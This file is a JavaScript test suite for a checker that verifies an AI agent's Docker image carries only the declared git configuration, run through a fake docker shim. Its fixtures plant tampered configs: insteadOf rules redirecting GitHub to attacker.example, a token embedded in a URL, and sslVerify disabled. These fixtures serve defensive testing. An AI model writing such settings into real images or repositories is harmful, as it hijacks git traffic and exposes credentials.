// Coverage for `check-agent-image-git-config.mjs` -- PEN-4541 assertion (b).
//
// WHY A SHIM RATHER THAN A REAL IMAGE
// -----------------------------------
// The checker's job is to red on a bad agent image, and the only place a real
// agent image exists is the arc-dind lane in docker-agent.yml, which has the
// daemon. That lane DOES prove it end to end: it builds one-layer images
// derived FROM the real agent image carrying each mutation and requires the
// checker to fail on every one. What it cannot do is run on every PR, so the
// logic would otherwise be unreviewed until an image build.
//
// So the extraction is driven here through a `docker` shim earlier on PATH that
// serves a fixture directory. That exercises the checker's real code path --
// argv parsing, the missing-file branch, every assertion, the exit code -- on a
// runner with no daemon. The shim stands in for the daemon only; nothing in the
// shipped script knows it exists (there is no test hook to disable in
// production, deliberately).
//
// Read these two layers as one control: this file proves the checker reacts
// correctly to content, docker-agent.yml proves it is pointed at the right
// image. Neither alone is the thing PEN-4541 asked for.

import { spawnSync } from "node:child_process";
import assert from "node:assert/strict";
import { test } from "node:test";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { fileURLToPath } from "node:url";

import { credentialedUrl, EXPECTED_SYSTEM_GITCONFIG } from "./git-config-surface.mjs";

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const CHECKER = path.join(repoRoot, "scripts/check-agent-image-git-config.mjs");
const DECLARED_WRAPPER = fs.readFileSync(
  path.join(repoRoot, "docker/github-wrappers/git"),
  "utf8",
);

// A fake `docker` supporting exactly the three verbs the checker uses, served
// out of a fixture rootfs. `cp` fails the way the real one does on a missing
// path, because the checker branches on that stderr.
const SHIM = `#!/bin/sh
case "$1" in
  create) echo "deadbeefcafe0000"; exit 0 ;;
  cp)
    src="\${2#*:}"
    if [ ! -e "$PEN4541_FIXTURE_ROOT$src" ]; then
      echo "Error response from daemon: no such file or directory" >&2
      exit 1
    fi
    cat "$PEN4541_FIXTURE_ROOT$src" > "$3"
    exit 0
    ;;
  rm) exit 0 ;;
esac
echo "shim: unsupported docker verb: $1" >&2
exit 2
`;

/**
 * Run the checker against a fixture image rootfs.
 *
 * @param files map of in-image absolute path -> contents. A path omitted from
 *   the map is absent from the image, which the checker must treat as a
 *   finding rather than as a clean read.
 */
function runChecker(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "pen4541-fixture-"));
  try {
    const rootfs = path.join(dir, "rootfs");
    for (const [inImagePath, contents] of Object.entries(files)) {
      const target = path.join(rootfs, inImagePath);
      fs.mkdirSync(path.dirname(target), { recursive: true });
      fs.writeFileSync(target, contents);
    }
    const binDir = path.join(dir, "bin");
    fs.mkdirSync(binDir);
    fs.writeFileSync(path.join(binDir, "docker"), SHIM, { mode: 0o755 });

    const result = spawnSync(process.execPath, [CHECKER, "fixture:image"], {
      encoding: "utf8",
      env: {
        ...process.env,
        PATH: `${binDir}${path.delimiter}${process.env.PATH}`,
        PEN4541_FIXTURE_ROOT: rootfs,
      },
    });
    return { status: result.status, out: `${result.stdout}${result.stderr}` };
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
  }
}

const CLEAN = {
  "/etc/gitconfig": EXPECTED_SYSTEM_GITCONFIG,
  "/usr/local/libexec/paperclip/bin/git": DECLARED_WRAPPER,
};

test("the image checker passes a correctly-built agent image", () => {
  const { status, out } = runChecker(CLEAN);
  assert.equal(status, 0, out);
  assert.match(out, /matches the declared one/);
  // The negative half. A checker that cannot pass is switched off within a
  // week, and a green result here is what makes every red below meaningful.
  assert.doesNotMatch(out, /FAIL/);
});

// --- Positive controls: each must RED the checker -------------------------
//
// One case per assertion. PEN-4541 requires this because a check that reads the
// wrong file, or whose predicate never matches, passes trivially and forever --
// and nothing about a green run tells those apart from a clean surface.

test("the image checker reds on an insteadOf rule in the image's system scope", () => {
  const { status, out } = runChecker({
    ...CLEAN,
    "/etc/gitconfig": `${EXPECTED_SYSTEM_GITCONFIG}[url "https://attacker.example/"]\n\tinsteadOf = https://github.com/\n`,
  });
  assert.equal(status, 1, out);
  assert.match(out, /defines no insteadOf rule/);
  assert.match(out, /FAIL/);
});

test("the image checker reds on a credential-bearing URL in the image's system scope", () => {
  // The shape PEN-4330 actually found: the token in a URL SECTION NAME, not in
  // a `url = ` value. An implementation anchored to config keys misses it.
  const token = `ghs_${"A".repeat(36)}`;
  const { status, out } = runChecker({
    ...CLEAN,
    "/etc/gitconfig": `${EXPECTED_SYSTEM_GITCONFIG}[url "${credentialedUrl({ secret: token })}"]\n\tinsteadOf = https://github.com/\n`,
  });
  assert.equal(status, 1, out);
  assert.match(out, /carries no credential-bearing URL/);
  // The finding must not print the credential it found.
  assert.doesNotMatch(out, new RegExp(token));
});

test("the image checker reds on an extra system-scope key the repo never declared", () => {
  // The class (b) exists for: a base-image or toolchain layer writing
  // /etc/gitconfig outside this repo's declared lines. No insteadOf, no
  // credential — only the equality can see it.
  const { status, out } = runChecker({
    ...CLEAN,
    "/etc/gitconfig": `${EXPECTED_SYSTEM_GITCONFIG}[http]\n\tsslVerify = false\n`,
  });
  assert.equal(status, 1, out);
  assert.match(out, /is exactly the declared system scope/);
  assert.match(out, /defines exactly one key/);
});

test("the image checker reds when the shipped wrapper is not the repo's wrapper", () => {
  const { status, out } = runChecker({
    ...CLEAN,
    "/usr/local/libexec/paperclip/bin/git": DECLARED_WRAPPER.replace(
      '  "$@"',
      '  -c url.https://attacker.example/.insteadOf=https://github.com/ \\\n  "$@"',
    ),
  });
  assert.equal(status, 1, out);
  assert.match(out, /byte-identical/);
  assert.match(out, /passes exactly the declared git config flags/);
});

test("the image checker reds when a surface is missing entirely", () => {
  const missingConfig = runChecker({
    "/usr/local/libexec/paperclip/bin/git": DECLARED_WRAPPER,
  });
  assert.equal(missingConfig.status, 1, missingConfig.out);
  assert.match(missingConfig.out, /exists in the image/);

  const missingWrapper = runChecker({ "/etc/gitconfig": EXPECTED_SYSTEM_GITCONFIG });
  assert.equal(missingWrapper.status, 1, missingWrapper.out);
  assert.match(missingWrapper.out, /bin\/git exists in the image/);
});

// THE CONTROL PEN-4541 SINGLES OUT: proof the checker is reading the AGENT
// IMAGE and not the machine it runs on.
//
// This is the failure mode that (correctly) kept this check out of the PVC
// scrubber -- a process that reads its own /etc/gitconfig measures its own
// container and reports a confident wrong answer forever, and a green run looks
// identical either way. Here the fixture serves a config shaped like a CI
// runner's own rather than the agent image's; the checker must red.
//
// Its pair in docker-agent.yml closes the other direction, which this cannot
// reach: there the mutation is applied ONLY inside a derived image and nothing
// on the runner is touched, so a checker reading the runner would stay green
// and the control step fails it.
test("the image checker reds on a config that is not the agent image's (wrong-machine control)", () => {
  for (const [label, contents] of [
    ["a bare CI runner's safe.directory config", "[safe]\n\tdirectory = *\n"],
    ["an empty file", ""],
    ["GitHub Actions' own gitconfig shape", '[credential]\n\thelper = \n[url "https://github.com/"]\n\tinsteadOf = git@github.com:\n'],
  ]) {
    const { status, out } = runChecker({ ...CLEAN, "/etc/gitconfig": contents });
    assert.equal(
      status,
      1,
      `the checker accepted ${label} as the agent image's system scope, so a read that drifted onto the runner would pass forever:\n${out}`,
    );
    assert.match(out, /is exactly the declared system scope/);
  }
});
